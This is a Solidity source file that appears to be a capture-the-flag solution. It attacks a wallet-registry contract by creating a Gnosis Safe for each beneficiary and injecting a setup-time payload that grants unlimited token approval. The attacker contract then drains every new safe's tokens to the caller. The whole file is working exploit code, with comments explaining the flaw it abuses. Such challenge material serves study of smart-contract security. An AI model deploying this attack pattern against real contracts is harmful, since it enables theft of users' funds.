// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

/**
 * @title TokenExploiter
 * @author MJ
 * @dev Barebones contract to approve a maximum token amount to a spender.
 */
contract TokenExploiter {
    function approveToken(IERC20 _token, address _spender) external {
        _token.approve(_spender, type(uint256).max);
    }
}

/**
 * @title WalletRegistryAttacker
 * @author MJ
 * @dev This contract is used to exploit the WalletRegistry contract.
 *      It deploys a Gnosis Safe wallet for each beneficiary and approves the attacker to spend all the tokens.
 *      This is possible because the WalletRegistry contract does not check whether the caller is a beneficiary.
 *      Luckily for us, the Gnosis safe does not enforce the multi sig threshold check during the setup phase, which would
 *      otherwise be enforced after setup. So, we pass in a malicious payload that approves the attacker to spend all the tokens.
 */
contract WalletRegistryAttacker {
    // A struct to hold all the data we need to pass to the constructor
    struct ExploiterPackage {
        address masterCopy;
        IERC20 token;
        GnosisSafeProxyFactory proxyFactory;
        IProxyCreationCallback walletRegistry;
        address[] beneficiaries;
    }

    /**
     * @notice The constructor deploys a Gnosis Safe wallet for each beneficiary and approves the attacker to spend all the tokens.
     * @param _exploiterPackage A struct containing all the data we need to pass to the constructor
     * @dev We do this step in the constructor because the challenge requires us to perform the exploit in a single tx.
     */
    constructor(ExploiterPackage memory _exploiterPackage) {
        _attack(_exploiterPackage, new TokenExploiter());
    }

    function _attack(
        ExploiterPackage memory _exploiterPackage,
        TokenExploiter _tokenExploiter
    ) internal {
        for (uint256 i; i < _exploiterPackage.beneficiaries.length; ) {
            // Set a temporary array because we can't pass an array to abi.encodeWithSelector inline
            address[] memory owners = new address[](1);
            owners[0] = _exploiterPackage.beneficiaries[i];
            bytes memory initCode = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners, // owners
                1, // threshold
                // This is the malicious payload that approves the attacker to spend all the tokens
                address(_tokenExploiter), // to,
                abi.encodeWithSelector(
                    TokenExploiter.approveToken.selector,
                    _exploiterPackage.token,
                    address(this)
                ), // data
                // The below do not matter
                address(0), // fallbackHandler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );

            address newSafe = address(
                _exploiterPackage.proxyFactory.createProxyWithCallback(
                    _exploiterPackage.masterCopy,
                    initCode,
                    0,
                    _exploiterPackage.walletRegistry
                )
            );

            _exploiterPackage.token.transferFrom(
                newSafe,
                msg.sender,
                _exploiterPackage.token.balanceOf(newSafe)
            );

            unchecked {
                ++i;
            }
        }
    }
}
